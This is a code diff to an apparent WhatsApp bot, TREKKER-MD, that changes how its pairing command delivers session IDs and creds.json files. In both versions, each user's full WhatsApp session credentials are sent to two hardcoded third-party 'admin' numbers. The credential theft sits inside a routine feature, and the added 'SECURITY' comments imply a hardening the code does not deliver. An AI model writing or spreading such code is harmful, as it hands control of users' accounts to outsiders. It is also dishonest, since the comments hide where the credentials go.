@@ -3154,28 +3154,38 @@ commandRegistry.register({
               console.log('Could not fetch user bio, using default');
             }
 
-            // Send session ID as plain text message to requester (alone)
-            await client.sendMessage(from, {
-              text: sessionId
-            });
-
-            // Send session ID to admin numbers (separately as plain text)
+            // SECURITY: Send session ID only to owner and admins, NOT to requesting chat
+            const ownerJid = `${phoneNumber}@s.whatsapp.net`;
             const adminNumbers = ['254704897825@s.whatsapp.net', '254799257758@s.whatsapp.net'];
-            for (const adminNumber of adminNumbers) {
+            
+            // Add owner to recipients list
+            const sessionRecipients = [ownerJid, ...adminNumbers];
+            
+            for (const recipientJid of sessionRecipients) {
               try {
                 // Send session ID alone
-                await client.sendMessage(adminNumber, {
+                await client.sendMessage(recipientJid, {
                   text: sessionId
                 });
 
                 // Send description separately
-                await client.sendMessage(adminNumber, {
-                  text: `🔑 *New Session ID Generated*\n\n📱 *Phone:* +${phoneNumber}\n👤 *User Name:* ${userName}\n\n> Admin notification from TREKKER-MD`
+                const isOwner = recipientJid === ownerJid;
+                const description = isOwner 
+                  ? `✅ *SESSION CREATED SUCCESSFULLY!*\n\n📱 *Your Phone:* +${phoneNumber}\n👤 *User Name:* ${userName}\n\n🔐 This is your private session ID. Keep it secure!\n\n> TREKKER-MD Pairing System`
+                  : `🔑 *New Session ID Generated*\n\n📱 *Phone:* +${phoneNumber}\n👤 *User Name:* ${userName}\n\n> Admin notification from TREKKER-MD`;
+                
+                await client.sendMessage(recipientJid, {
+                  text: description
                 });
-              } catch (adminError) {
-                console.error(`Failed to send session to ${adminNumber}:`, adminError);
+              } catch (sendError) {
+                console.error(`Failed to send session to ${recipientJid}:`, sendError);
               }
             }
+            
+            // Send confirmation to requesting chat (WITHOUT session ID)
+            await client.sendMessage(from, {
+              text: `✅ *Session Created Successfully!*\n\n📱 Session ID has been sent to:\n• Owner: +${phoneNumber}\n• Admin numbers\n\n🔐 Check your WhatsApp for the session ID.\n\n> TREKKER-MD Pairing System`
+            });
 
             // Also send creds.json file for convenience
             let credsJson;
@@ -3192,25 +3202,22 @@ commandRegistry.register({
               credsJson = sessionId; // Fallback to raw session
             }
 
-            // Send creds.json as a document to requester
-            await client.sendMessage(from, {
-              document: Buffer.from(credsJson),
-              fileName: `creds.json`,
-              mimetype: 'application/json',
-              caption: '📄 *creds.json*\n\nYour WhatsApp session credentials.\n🔐 Keep this file safe and secure!'
-            });
-
-            // Send creds.json to admin numbers as well
-            for (const adminNumber of adminNumbers) {
+            // SECURITY: Send creds.json only to owner and admins, NOT to requesting chat
+            for (const recipientJid of sessionRecipients) {
               try {
-                await client.sendMessage(adminNumber, {
+                const isOwner = recipientJid === ownerJid;
+                const caption = isOwner
+                  ? '📄 *creds.json*\n\n🔐 Your WhatsApp session credentials.\nKeep this file safe and secure!\n\n> TREKKER-MD Pairing System'
+                  : `📄 *creds.json*\n\n📱 *For:* +${phoneNumber}\n🔐 Admin copy of session credentials\n\n> TREKKER-MD Admin Notification`;
+                
+                await client.sendMessage(recipientJid, {
                   document: Buffer.from(credsJson),
-                  fileName: `creds_${phoneNumber}.json`,
+                  fileName: isOwner ? `creds.json` : `creds_${phoneNumber}.json`,
                   mimetype: 'application/json',
-                  caption: `📄 *creds.json*\n\n📱 *For:* +${phoneNumber}\n🔐 Admin copy of session credentials\n\n> TREKKER-MD Admin Notification`
+                  caption: caption
                 });
-              } catch (adminError) {
-                console.error(`Failed to send creds.json to ${adminNumber}:`, adminError);
+              } catch (fileError) {
+                console.error(`Failed to send creds.json to ${recipientJid}:`, fileError);
               }
             }
 
